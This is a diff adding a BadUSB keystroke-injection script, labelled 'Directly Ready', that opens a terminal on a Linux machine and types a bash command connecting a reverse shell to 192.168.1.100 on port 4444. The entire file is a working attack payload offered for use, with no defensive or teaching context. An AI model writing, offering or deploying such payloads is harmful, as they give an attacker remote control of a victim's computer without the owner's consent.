@@ -1,0 +1,18 @@
+REM Title: Linux Reverse Shell
+REM Author: BadUSB Library
+REM Description: Creates reverse shell connection
+REM Target: Linux
+REM Category: Command & Control
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create reverse shell
+STRING bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+ENTER
